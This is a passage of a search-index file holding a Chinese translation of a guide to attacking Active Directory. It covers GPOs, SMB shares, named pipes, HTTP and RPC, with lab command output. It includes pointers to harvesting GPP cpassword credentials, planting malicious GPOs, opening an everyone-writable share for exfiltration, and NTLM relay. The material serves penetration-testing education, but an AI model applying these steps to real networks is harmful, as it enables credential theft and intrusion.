<p>\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u8fd9\u4e9b\u76ee\u5f55\u4e0b\u6587\u4ef6\u548c\u76ee\u5f55\u53ef\u80fd\u53ef\u80fd\u5dee\u5f02\u8f83\u5927\uff1b\u60a8\u53ef\u4ee5\u5728\u5176\u4e2d\u627e\u5230\u914d\u7f6eINI\u6587\u4ef6\uff0c\u8fd9\u4e9b\u6587\u4ef6\u6307\u5b9a\u8981\u6267\u884c\u7684\u6ce8\u518c\u8868\u9879\u503c\u3001\u7ec4\u6210\u5458\u6216\u811a\u672c\u3002\u800c\u4e14\uff0c\u5982\u679c\u5e78\u8fd0\u7684\u8bdd\uff0c\u4e5f\u8bb8\u5728\u5e26\u6709cpassword\u6807\u8bb0\u7684\u811a\u672c\u6216\u7ec4\u7b56\u7565\u9996\u9009\u9879(GPP)\u6587\u4ef6\u4e2d\u80fd\u627e\u5230\u4e00\u4e9b\u51ed\u636e\u3002\u6b64\u5916\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528Get-GPPPasword\u811a\u672c\u6765\u641c\u7d22GPP\u51ed\u636e\u3002</p> <p>\u7ec4\u7b56\u7565\u9996\u9009\u9879\u662f\u7528\u4e8eWindows Server 2008\u5f15\u5165\u7684\u4e00\u7ec4\u65b0\u7b56\u7565\u7684\u540d\u79f0\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#group-policy-container","title":"Group Policy container","text":"<p>\u4e3a\u4e86\u5e2e\u52a9\u8ba1\u7b97\u673a\u5b9a\u4f4d\u7ec4\u7b56\u7565\u6a21\u677f\uff0cActive Directory\u6570\u636e\u5e93\u5c06\u6709\u5173GPO\u7684\u4fe1\u606f\u5b58\u50a8\u5728CN=Policies,CN=System,DC=,DC=\u5bb9\u5668\u4e2d\u3002\u800c\u6bcf\u4e2aGPO\u5219\u5b58\u50a8\u5728GroupPolicyContainer\u5bf9\u8c61\u4e2d\uff0c\u8be5\u5bf9\u8c61\u5305\u542bGUID\u3001GPO\u548cGP\u6a21\u677f\u7684\u8def\u5f84\u3002 <p><code>PS C:\\&gt; Get-ADObject -LDAPFilter \"(ObjectClass=GroupPolicyContainer)\" -Properties Name, DisplayName,gPCFileSysPath | select Name, DisplayName,GPCFileSysPath | Format-List  Name           : {31B2F340-016D-11D2-945F-00C04FB984F9} DisplayName    : Default Domain Policy GPCFileSysPath : \\\\contoso.local\\sysvol\\contoso.local\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}  Name           : {6AC1786C-016F-11D2-945F-00C04fB984F9} DisplayName    : Default Domain Controllers Policy GPCFileSysPath : \\\\contoso.local\\sysvol\\contoso.local\\Policies\\{6AC1786C-016F-11D2-945F-00C04fB984F9}  Name           : {BE864EFE-6C07-4A53-A9D8-7EB6EB36BE5A} DisplayName    : test policy GPCFileSysPath : \\\\contoso.local\\SysVol\\contoso.local\\Policies\\{BE864EFE-6C07-4A53-A9D8-7EB6EB36BE5A}</code></p> <p>\u663e\u793a\u57dfGPO</p> <p>\u60a8\u5e94\u8be5\u6ce8\u610f\u5230\uff0cGPO GUID\u4e0d\u540c\u4e8e\u7528\u4e8e\u6807\u8bc6Active Directory\u6570\u636e\u5e93\u4e2d\u6bcf\u4e2a\u5bf9\u8c61\u7684GUID\u3002\u8fd8\u8981\u6ce8\u610f\uff0c\u5982\u679c\u60a8\u80fd\u591f\u7f16\u8f91GPO\u7684GPCFileSysPath\u5c5e\u6027\uff0c\u5219\u53ef\u4ee5\u8bbe\u7f6e\u5904\u4e8e\u60a8\u63a7\u5236\u4e0b\u7684\u8def\u5f84\u5e76\u521b\u5efa\u6076\u610fGPO\uff0c\u5176\u4e2d\u53ef\u4ee5\u5305\u542b\u5c06\u5728\u591a\u53f0\u8ba1\u7b97\u673a\u4e0a\u6267\u884c\u7684\u6076\u610f\u811a\u672c\u3002</p> <p>\u53e6\u4e00\u65b9\u9762\uff0c\u57df\u3001OU\u3001\u7ad9\u70b9\u7684\u6570\u636e\u5e93\u5bf9\u8c61\u53ef\u4ee5\u901a\u8fc7GpLink\u5c5e\u6027\u5173\u8054\u5230GPO\u3002</p> <p><code>PS C:\\&gt; Get-ADObject -LDAPFilter '(gPLink=*)' -Properties CanonicalName,gpLink | select objectclass,CanonicalName,gplink | Format-List  objectclass   : domainDNS CanonicalName : contoso.local/ gplink        : [LDAP://cn={BE864EFE-6C07-4A53-A9D8-7EB6EB36BE5A},cn=policies,cn=system,DC=contoso,DC=local;1][LDAP://C                 N={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=contoso,DC=local;0]  objectclass   : organizationalUnit CanonicalName : contoso.local/Domain Controllers gplink        : [LDAP://CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=contoso,DC=local;0]  objectclass   : organizationalUnit CanonicalName : contoso.local/web servers gplink        : [LDAP://cn={BE864EFE-6C07-4A53-A9D8-7EB6EB36BE5A},cn=policies,cn=system,DC=contoso,DC=local;0]</code></p> <p>\u663e\u793a\u5173\u8054\u4e86GPO\u7684\u57df\u548cOU</p> <p><code>PS C:\\&gt; Get-ADObject -LDAPFilter '(gPLink=*)' -SearchBase \"CN=Configuration,$((Get-ADDomain).DistinguishedName)\" -Properties CanonicalName,gpLink | select objectclass,CanonicalName,gplink | Format-List  objectclass   : site CanonicalName : contoso.local/Configuration/Sites/mysite gplink        : [LDAP://cn={BE864EFE-6C07-4A53-A9D8-7EB6EB36BE5A},cn=policies,cn=system,DC=contoso,DC=local;0]</code></p> <p>\u663e\u793a\u4e0eGPO\u76f8\u5173\u8054\u7684\u7ad9\u70b9</p> <p>\u8ba1\u7b97\u673a\u53ef\u4ee5\u901a\u8fc7\u68c0\u67e5\u5b83\u6240\u5c5e\u7684OU\u5bf9\u8c61\u548c\u57df\u5bf9\u8c61\u6765\u786e\u5b9a\u5e94\u7528\u4e8e\u81ea\u5df1\u7684GPO\u3002</p> <p>\u4f8b\u5982\uff0c\u4e00\u53f0\u8ba1\u7b97\u673a\u5bf9\u8c61\u4f4d\u4e8ecn=mypc,OU=workstations,OU=computers,dc=domain,dc=com\u4e2d\u7684\u8ba1\u7b97\u673a\u5c06\u5e94\u7528workstations\u548ccomputer OU\uff0c\u4ee5\u53cadomain.com\u57df\u7684GPO\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#communication-protocols","title":"Communication Protocols","text":"<p>\u5728Active Directory\u4e2d\uff0c\u6709\u8bb8\u591a\u534f\u8bae\u7528\u4e8e\u5b9e\u73b0\u673a\u5668\u4e4b\u95f4\u7684\u901a\u4fe1\u3002\u5b83\u4eec\u53ef\u4ee5\u7528\u4e8e\u8de8\u7f51\u7edc\u8df3\u8f6c\uff0c\u4ece\u800c\u5b9e\u73b0\u5728\u4e0d\u540c\u73af\u5883\u7684\u8ba1\u7b97\u673a\u4e0a\u5b9e\u73b0\u4ee3\u7801\u6267\u884c\uff0c\u56e0\u6b64\u4e86\u89e3\u5b83\u4eec\u7684\u76ee\u7684\u548c\u5b83\u4eec\u63d0\u4f9b\u7684\u529f\u80fd\u662f\u975e\u5e38\u91cd\u8981\u7684\u3002</p> <p>\u60a8\u53ef\u4ee5\u5728Microsoft\u6587\u6863\u4e2d\u68c0\u7d22Windows\u670d\u52a1\u6240\u9700\u7684\u7aef\u53e3\u3002</p> <p>\u6240\u4ee5\uff0c\u8ba9\u6211\u4eec\u6765\u56de\u987e\u4e00\u4e0b\u8fd9\u4e9b\u534f\u8bae\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#smb","title":"SMB","text":"<p>SMB\uff08Server Message Block\uff09\u662f\u5728Active Directory\u7f51\u7edc\uff08\u548c\u4efb\u4f55\u5176\u4ed6Windows\u7f51\u7edc\uff09\u4e2d\u5e7f\u6cdb\u4f7f\u7528\u7684\u4e00\u79cd\u534f\u8bae\uff0c\u7528\u4e8e\u5728\u8ba1\u7b97\u673a\uff08\u901a\u5e38\u662fWindows\u8ba1\u7b97\u673a\uff09\u4e4b\u95f4\u5171\u4eab\u6587\u4ef6\u548c\u901a\u4fe1\u3002</p> <p>\u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u6bcf\u53f0Windows\u8ba1\u7b97\u673a\u90fd\u5141\u8bb8\u4f7f\u7528SMB\u534f\u8bae\u6765\u8fde\u63a5\u5b83\u3002\u6700\u521d\uff0cSMB\u662f\u901a\u8fc7NetBIOS\uff08\u6570\u636e\u62a5\u548c\u4f1a\u8bdd\u670d\u52a1\uff09\u4f7f\u7528\u7684\uff0c\u4f46\u73b0\u5728\u5b83\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7TCP\u4f7f\u7528\u3002Windows\u8ba1\u7b97\u673a\u901a\u5e38\u4f1a\u5f00\u653e\u7aef\u53e3445/TCP\u4ee5\u5904\u7406SMB\u8fde\u63a5\u3002</p> <pre><code>                             `.--------                                 |                                 |                               .---                    .--NBSSN--&gt;| 139                    |          '---          .-----.   |            |  Windows          | SMB |&gt;--|            |          '-----'   |            |  machine             |      |          .---             |      '---TCP---&gt;| 445             |                 '---             |                   |             |                   |             |                   '--------      .------------.      |            |   .------.   .----------.   | NTLM |   | Kerberos |   '------'   '----------'`\n</code></pre> <p>SMB\u548c\u76f8\u5173\u534f\u8bae/\u7aef\u53e3</p> <p>\u5bf9\u4e8e\u653b\u51fb\u8005\u6765\u8bf4\uff0c\u4e86\u89e3SMB\u662f\u975e\u5e38\u6709\u7528\u7684\uff0c\u56e0\u4e3aSMB\u53ef\u7528\u4e8e\u521b\u5efa\u5171\u4eab\uff0c\u800c\u5171\u4eab\u53ef\u80fd\u5305\u542b\u6709\u4ef7\u503c\u7684\u4fe1\u606f\uff0c\u5e76\u53ef\u7528\u4e8e\u4ece\u8ba1\u7b97\u673a\u4e2d\u6e17\u900f\u4fe1\u606f\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#shares","title":"Shares","text":"<p>\u5171\u4eab\u5c31\u50cf\u4e00\u53f0\u673a\u5668\u5171\u4eab\u7684\u6587\u4ef6\u5939\uff0c\u4ee5\u4fbf\u7f51\u7edc\u4e2d\u7684\u5176\u4ed6\u8ba1\u7b97\u673a/\u7528\u6237\u8fdb\u884c\u8bbf\u95ee\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528net view\u547d\u4ee4\u3001Get-SmbShare Powershell Cmdlet\u6216smbclient.py\u5217\u51fa\u5171\u4eab\u3002</p> <p><code>C:\\&gt; net view \\\\dc01.contoso.local /all Shared resources at \\\\dc01.contoso.local  Share name  Type  Used as  Comment  ------------------------------------------------------------------------------- ADMIN$      Disk           Remote Admin C$          Disk           Default share IPC$        IPC            Remote IPC NETLOGON    Disk           Logon server share SYSVOL      Disk           Logon server share The command completed successfully.</code></p> <p>\u57dfDC\u7684\u5171\u4eab</p> <p>\u60a8\u53ef\u4ee5\u50cf\u8bbf\u95ee\u672c\u5730\u8ba1\u7b97\u673a\u4e2d\u7684\u6587\u4ef6\u5939\u90a3\u6837\u6765\u8bbf\u95ee\u5176\u4ed6\u8ba1\u7b97\u673a\u7684\u5171\u4eab\u3002\u4e3a\u4e86\u8bbf\u95ee\u5171\u4eab\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528\u7c7b\u4f3c\\dc01.contoso.local\\SYSVOL\\\u8fd9\u6837\u7684UNC\u8def\u5f84\uff0c\u6216\u8005\u901a\u8fc7\u4f7f\u7528net use\u547d\u4ee4\u5c06\u8fdc\u7a0b\u5171\u4eab\u6620\u5c04\u5230\u672c\u5730\u8bbe\u5907\u3002</p> <p>\u82e5\u8981\u5728UNC\u8def\u5f84\u4e2d\u5f15\u7528\u76ee\u6807\u8ba1\u7b97\u673a\uff0c\u53ef\u4ee5\u4f7f\u7528\u5176dns\u540d\u79f0\u6216NetBIOS\u540d\u79f0\u3002\u4f8b\u5982\uff0cnet view \\dc01.contoso.local\u6216net view \\dc01\u3002</p> <p><code>C:\\&gt; dir \\\\dc01\\sysvol  Volume in drive \\\\dc01\\sysvol has no label.  Volume Serial Number is 609D-528B   Directory of \\\\dc01\\sysvol  28/11/2020  11:02    &lt;DIR&gt;          . 28/11/2020  11:02    &lt;DIR&gt;          .. 28/11/2020  11:02    &lt;JUNCTION&gt;     contoso.local [C:\\Windows\\SYSVOL\\domain]                0 File(s)              0 bytes                3 Dir(s)  20,050,214,912 bytes free</code></p> <p>\u5217\u51fa\u5171\u4eab\u4e2d\u7684\u6587\u4ef6\u5939</p> <p>\u5171\u4eab\u5bf9\u4e8e\u7528\u6237\u8bbf\u95ee\u5176\u4ed6\u673a\u5668\u7684\u6587\u4ef6\u975e\u5e38\u6709\u7528\uff0c\u5982\u679c\u4e0d\u7528\u5b83\u7684\u8bdd\uff0c\u6709\u65f6\u53ef\u80fd\u9700\u8981\u4f7f\u7528\u7279\u6b8a\u7a0b\u5e8f\u6216\u7c7b\u4f3c\u7684\u4e1c\u897f\u3002\u56e0\u6b64\uff0c\u5b83\u4eec\u5bf9\u4e8e\u653b\u51fb\u8005\u5c06\u6587\u4ef6\u4ece\u4e00\u53f0\u8ba1\u7b97\u673a\u79fb\u52a8\u5230\u53e6\u4e00\u53f0\u8ba1\u7b97\u673a\u4ee5\u4fbf\u6e17\u51fa\u4e5f\u662f\u975e\u5e38\u5b9e\u7528\u7684\u3002</p> <p><code>net share Temp=C:\\Temp /grant:everyone,FULL</code></p> <p>\u521b\u5efa\u6240\u6709\u4eba\u90fd\u53ef\u4ee5\u8bbf\u95ee\u7684\u5171\u4eab</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#default-shares","title":"Default shares","text":"<p>\u60a8\u4ee5\u524d\u53ef\u80fd\u6ce8\u610f\u5230\uff0c\u6709\u4e00\u4e9b\u5171\u4eab\u662f\u4ee5$\u7ed3\u5c3e\u7684\uff0c\u6bd4\u5982C$\u3001ADMIN$\u548cIPC$\uff0c\u5b9e\u9645\u4e0a\uff0c\u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5b83\u4eec\u5b58\u5728\u4e8e\u6240\u6709Windows\u8ba1\u7b97\u673a\u4e2d\u3002</p> <p>\u4e3a\u4e86\u8bbf\u95eeC$\u548cADMIN$\uff0c\u60a8\u9700\u8981\u5728\u76ee\u6807\u8ba1\u7b97\u673a\u4e2d\u5177\u6709\u7ba1\u7406\u5458\u6743\u9650\u3002\u901a\u8fc7\u8fd9\u4e9b\u5171\u4eab\uff08\u7279\u522b\u662fC$)\uff0c\u60a8\u53ef\u4ee5\u68c0\u9605\u6240\u6709\u7684\u8ba1\u7b97\u673a\u6587\u4ef6\u3002\u5b9e\u9645\u4e0a\uff0c\u67d0\u4e9b\u5de5\u5177\u90fd\u4f1a\u7528\u5230\u8fd9\u4e9b\u5171\u4eab\uff0c\u4f8b\u5982\uff0cPSECEC\u5c31\u662f\u4f7f\u7528ADMIN$\u5171\u4eab\u6765\u90e8\u7f72\u4e00\u4e2a\u8d1f\u8d23\u6267\u884c\u7ed9\u5b9a\u547d\u4ee4\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u3002</p> <p>\u800cIPC$\u5219\u662f\u7528\u4e8e\u521b\u5efa\u547d\u540d\u7ba1\u9053\u7684\u7279\u6b8a\u5171\u4eab\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#default-domain-shares","title":"Default domain shares","text":"<p>\u9664\u4e86\u4e0a\u9762\u7684\u516c\u7528\u5171\u4eab\u4e4b\u5916\uff0c\u5728\u57df\u4e2d\uff0c\u57df\u63a7\u5236\u5668\u8fd8\u53d1\u5e03\u57df\u4e2d\u4efb\u4f55\u7528\u6237/\u8ba1\u7b97\u673a\u90fd\u53ef\u4ee5\u4f7f\u7528\u7684SYSVOL\u548cNETLOGON\u5171\u4eab\u3002\u5b83\u4eec\u7528\u4e8e\u5b58\u50a8\u57df\u4e2d\u6240\u6709\u673a\u5668\uff08\u81f3\u5c11\u662fWindows\u673a\u5668\uff09\u90fd\u9700\u8981\u8bbf\u95ee\u7684\u6587\u4ef6\u3002</p> <p>SYSVOL\u5171\u4eab\u901a\u5e38\u7528\u4e8e\u5b58\u50a8\u8ba1\u7b97\u673a\u7528\u6765\u8bfb\u53d6\u90e8\u7f72\u5728\u57df\u4e2d\u7684\u7ec4\u7b56\u7565\u7684Group Policy\u6a21\u677f\u3002\u6709\u65f6\u8fd9\u4e9b\u7b56\u7565\u751a\u81f3\u53ef\u80fd\u5305\u542b\u5bc6\u7801\u3002\u60a8\u53ef\u4ee5\u901a\u8fc7<code>\\\\&lt;domain&gt;\\SYSVOL</code>\u8def\u5f84\u8bbf\u95eeSYSVOL\u5171\u4eab\u3002</p> <p><code>PS C:\\&gt; dir \\\\contoso.local\\SYSVOL\\contoso.local      Directory: \\\\contoso.local\\SYSVOL\\contoso.local   Mode                 LastWriteTime         Length Name ----                 -------------         ------ ---- d-----        19/04/2021     17:12                Policies d-----        28/11/2020     10:02                scripts</code></p> <p>\u5217\u51faSYSVOL\u6587\u4ef6\u5939</p> <p><code>\\\\&lt;domain&gt;\\\\SYSVOL\\&lt;domain&gt;\\scripts</code>\u7b56\u7565\u662fNETLOGON\u5171\u4eab\u7684\u522b\u540d\u3002NETLOGON\u5171\u4eab\u7528\u4e8e\u5b58\u50a8\u9700\u8981\u4e3a\u57df\u7684\u8ba1\u7b97\u673a\u6267\u884c\u7684\u767b\u5f55\u811a\u672c\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#named-pipes","title":"Named pipes","text":"<p>IPC$\u5171\u4eab\u5e76\u4e0d\u662f\u4e00\u4e2a\u76ee\u5f55\uff0c\u76f8\u53cd\uff0c\u5b83\u662f\u7528\u4e8e\u521b\u5efa\u547d\u540d\u7ba1\u9053\u7684\uff0c\u5141\u8bb8\u4e0d\u540c\u8ba1\u7b97\u673a\u7684\u8fdb\u7a0b\u901a\u8fc7RPC\uff08\u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\uff09\u7b49\u673a\u5236\u4e92\u76f8\u901a\u4fe1\u3002</p> <p>\u547d\u540d\u7ba1\u9053\u53ef\u4ee5\u88ab\u89c6\u4e3a\u5141\u8bb8\u673a\u5668\u4e4b\u95f4\u8fdb\u884c\u901a\u4fe1\u7684TCP\u7aef\u53e3\uff0c\u4f46\u53ea\u80fd\u5728SMB\u534f\u8bae\u5185\u90e8\u4f7f\u7528\u3002\u5b83\u4eec\u7528\u4e8e\u6267\u884cRPC\u8c03\u7528\uff0c\u5141\u8bb8\u5404\u79cd\u534f\u8bae\u901a\u8fc7SMB\u8fdb\u884c\u901a\u4fe1\u3002</p> <p>\u901a\u5e38\uff0c\u5728RPC/SMB\u5806\u6808\u4e0a\u5de5\u4f5c\u7684\u534f\u8bae\u90fd\u5b9a\u4e49\u4e86\u4e00\u4e2a\u5df2\u77e5\u7684\u547d\u540d\u7ba1\u9053\uff0c\u53ef\u7528\u4e8e\u4e0e\u8fdc\u7a0b\u670d\u52a1\u8054\u7cfb\uff08\u4e0eTCP/UDP\u7aef\u53e3\u7684\u60f3\u6cd5\u76f8\u540c\uff09\u3002\u4f8b\u5982\uff0cRPC\u4f7f\u7528\\pipe\\Netlogon\u547d\u540d\u7ba1\u9053\u4ea4\u6362Netlogon\u534f\u8bae\u7684\u6d88\u606f\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#http","title":"HTTP","text":"<p>HTTP\uff08Hypertext Transfer Protocol\uff09\u53ef\u80fd\u662f\u6700\u8457\u540d\u7684\u5e94\u7528\u7a0b\u5e8f\u534f\u8bae\uff0c\u56e0\u4e3a\u5b83\u662f\u7528\u4e8eWeb\u7684\u534f\u8bae\u3002\u4f46\u5b83\u9664\u4e86\u4e3b\u8981\u7528\u4e8e\u4e92\u8054\u7f51\u5916\uff0c\u5728Active Directory\u4e2d\u4e5f\u7ecf\u5e38\u7528\u5230\u3002</p> <p>HTTP\u88abActive Directory\u57df\u4e2d\u7684\u8bb8\u591a\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\u534f\u8bae\u7528\u4f5c\u4f20\u8f93\u534f\u8bae\uff0c\u5982WinRM\uff08\u4ee5\u53caPowershell Remoting)\u3001RPC\u6216ADWS\uff08Active Directory Web Services\uff09\u3002</p> <pre><code>                             `.----------                                  |                                .---                       .-------&gt;| 80 HTTP / WebDAV                       |        '---                       |          |                       |          |                       |        .---                       |-------&gt;| 443 HTTPS / WebDAV / PSWA                       |        '---                       |          |                       |          |                       |        .---                       |-------&gt;| 593 RPC over HTTP Endpoint Mapper                       |        '---           .---------.   |          |         | HTTP(S) |&gt;--|          |         '---------'   |        .---              |        |-------&gt;| 5985 WinRM HTTP              |        |        '---              |        |          |              |        |          |              |        |        .---              |        |-------&gt;| 5986 WinRM HTTPS              |        |        '---              |        |          |              |        |          |              |        |        .---              |        '-------&gt;| 9389 ADWS (on DCs)              |                 '---              |                   |              |                   '----------       .-------------.       |             |   .------.     .----------.   | NTLM |     | Kerberos |   '------'     '----------'`\n</code></pre> <p>Active Directory\u4e2dHTTP\u670d\u52a1\u4f7f\u7528\u7684\u7aef\u53e3</p> <p>\u4e3a\u4e86\u4e0eActive Directory\u5b8c\u7f8e\u96c6\u6210\u5728\u4e00\u8d77\uff0cHTTP\u652f\u6301\u4f7f\u7528NTLM\u548cKerberos\u534f\u8bae\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002\u4ece\u5b89\u5168\u89d2\u5ea6\u6765\u770b\uff0c\u8fd9\u5f88\u91cd\u8981\uff0c\u56e0\u4e3a\u8fd9\u610f\u5473\u7740HTTP\u8fde\u63a5\u5bb9\u6613\u53d7\u5230Kerberos\u59d4\u6d3e\u6216NTLM\u4e2d\u7ee7\u653b\u51fb\u3002</p> <p>\u5bf9\u4e8eNTLM\u4e2d\u7ee7\uff0c\u9700\u8981\u7279\u522b\u6ce8\u610f\u7684\u662f\uff0cHTTP\u8fde\u63a5\u4e0d\u9700\u8981\u7b7e\u540d\uff0c\u56e0\u6b64\u5f88\u5bb9\u6613\u53d7\u5230NTLM\u4ea4\u53c9\u4e2d\u7ee7\u653b\u51fb\u3002\u4e8b\u5b9e\u4e0a\uff0c\u6709\u8bb8\u591a\u653b\u51fb\u65b9\u5f0f\uff0c\u5982PrivExchange\u6216\u67d0\u4e9bKerberos RBCD\u8ba1\u7b97\u673a\u63a5\u7ba1\u653b\u51fb\uff0c\u90fd\u4f9d\u8d56\u4e8e\u4eceHTTP\u5230LDAP\u7684NTLM\u4e2d\u7ee7\u3002\u5982\u679c\u60a8\u80fd\u591f\u5f3a\u5236\u8ba1\u7b97\u673a\u4f7f\u7528\u5177\u6709NTLM\u8eab\u4efd\u9a8c\u8bc1\u7684\u8ba1\u7b97\u673a\u57df\u5e10\u6237\u6267\u884cHTTP\u8bf7\u6c42\uff0c\u90a3\u4e48\u60a8\u5c31\u53ef\u4ee5\u5229\u7528Kerberos RBCD\u9ed1\u9b54\u6cd5\u6765\u5165\u4fb5\u8ba1\u7b97\u673a\u3002</p> <p>\u4e0eHTTP\u76f8\u5173\u7684\u662f\uff0c\u60a8\u53ef\u4ee5\u5728Windows\u8ba1\u7b97\u673a\u4e2d\u5b89\u88c5IIS Web\u670d\u52a1\u5668\uff0c\u8fd9\u662fWebDAV\u6216PSWA\uff08Powershell web Access\uff09\u7b49\u4e00\u4e9b\u6280\u672f\u7684\u57fa\u7840\uff0c\u8fd9\u4e9b\u6280\u672f\u53ef\u4ee5\u5728/PSWA\u7aef\u70b9\u4e2d\u542f\u7528\u3002</p> <p></p> <p>PSWA\u767b\u5f55</p> <p>\u6b64\u5916\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528Pivotnacci\u5728IIS\u5b89\u88c5\u4e2d\u521b\u5efa\u57fa\u4e8eHTTP\u7684SOCKS\u4ee3\u7406\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#rpc","title":"RPC","text":"<p>RPC\uff08Remote Procedure Call\uff09\u662f\u4e00\u79cd\u534f\u8bae\uff0c\u5b83\u5141\u8bb8\u6765\u81ea\u4e0d\u540c\u673a\u5668\u7684\u7a0b\u5e8f\u901a\u8fc7\u7f51\u7edc\u8c03\u7528\u51fd\u6570\u5728\u5b83\u4eec\u4e4b\u95f4\u8fdb\u884c\u901a\u4fe1\u3002Microsoft\u5f00\u53d1\u4e86\u4e00\u4e2a\u79f0\u4e3aMSRPC\u7684RPC\u534f\u8bae\uff0c\u5b83\u662fDCE/RPC\u7684\u4e00\u4e2a\u4fee\u6539\u7248\u672c\uff0c\u5e76\u8fdb\u884c\u4e86\u4e00\u4e9b\uff08\u5728RPCE\u4e2d\u5b9a\u4e49\u7684\uff09\u6269\u5c55\u3002</p> <p>MSRPC\u53ef\u4ee5\u4f7f\u7528\u4e0d\u540c\u7684\u4f20\u8f93\u534f\u8bae\uff0c\u4f8b\u5982\uff1a</p> <ul> <li>TCP\uff0c\u5c06\u7aef\u53e3135\u4f5c\u4e3a\u7aef\u70b9\u6620\u5c04\u5668\uff0c\u5e76\u5c06\u7aef\u53e349152\u81f365535\u4f5c\u4e3a\u7aef\u70b9</li> <li>SMB\uff0c\u4f7f\u7528\u547d\u540d\u7ba1\u9053</li> <li>NetBIOS</li> <li>HTTP\uff0c\u4f7f\u7528\u7aef\u53e3593\u4f5c\u4e3a\u7aef\u70b9\u6620\u5c04\u5668\uff0c\u7aef\u53e349152\u81f365535\u4f5c\u4e3a\u7aef\u70b9<pre><code>                                         `.---              .-----&gt;-----------&gt;----------------&gt;| 135 Endpoint Mapper              |                                   '---              |              |                       .-------.   .---              |-----&gt;------------.---&gt;| NBSSN |--&gt;| 139              |                  |    '-------'   '---              |                  ^  .-----.     |      .-----.     |                .---  | RPC |&gt;----|-----&gt;| SMB |&gt;----'---------------&gt;| 445  '-----'     |      '-----'                      '---     |        |         |     |        |         |        .------.         .---     |        |-----&gt;---|-------&gt;| HTTP |&gt;--.----&gt;| 593 Endpoint Mapper     |        |         |        '------'   |     '---     |        |         |           |       v     |        |         |           |       |     .---     |        '-----&gt;---|-------&gt;---|-------'----&gt;| 49152 - 65535     |                  |           |             '---     |                  |           |     '-----------------.'-----------'                       |                 .-----'-----.                 |           |              .------.  .----------.              | NTLM |  | Kerberos |              '------'  '----------'`\n</code></pre> </li> </ul> <p>RPC\u76f8\u5173\u7684\u534f\u8bae\u548c\u7aef\u53e3</p> <p>\u5728\u4e00\u4e2a\u57df\u4e2d\uff0cMSRPC\u4e0d\u65ad\u5730\u88ab\u8ba1\u7b97\u673a\u7528\u4e8e\u5b83\u4eec\u4e4b\u95f4\u7684\u901a\u4fe1\u3002Windows\u673a\u5668\u4f7f\u7528MSRPC\u5b8c\u6210\u5f88\u591a\u4e0d\u540c\u7684\u4efb\u52a1\uff0c\u5982\u7ba1\u7406\u670d\u52a1\u6216\u8bfb\u53d6\u5176\u4ed6\u673a\u5668\u7684\u6ce8\u518c\u8868\u3002</p> <p>RPC\u4e5f\u88ab\u5e7f\u6cdb\u7528\u4e8e\u901a\u8fc7LRPC\uff08Local RPC\uff09\u6216ALPC\uff08Advanced Local Procedure Call\uff09\u4e0e\u672c\u5730\u673a\u5668\u4e2d\u7684\u7a0b\u5e8f\u8fdb\u884c\u901a\u4fe1\u3002</p> <p>\u4e3a\u4e86\u6267\u884c\u6240\u6709\u8fd9\u4e9b\u4efb\u52a1\uff0cMicrosoft\u5b9a\u4e49\u4e86\u591a\u4e2a\u8d1f\u8d23\u4e0d\u540c\u529f\u80fd\u7684MSRPC\u63a5\u53e3\uff1b\u5229\u7528\u8fd9\u4e9b\u63a5\u53e3\uff0c\u53ef\u4ee5\u4ece\u8fdc\u7a0b\u7a0b\u5e8f\u67e5\u8be2/\u8c03\u7528\u8ba1\u7b97\u673a\u7684\u4e0d\u540c\u670d\u52a1\u3002</p> <p>\u6bcf\u4e2a\u63a5\u53e3\u90fd\u7531\u4e00\u4e2aUUID\uff08Universally unique 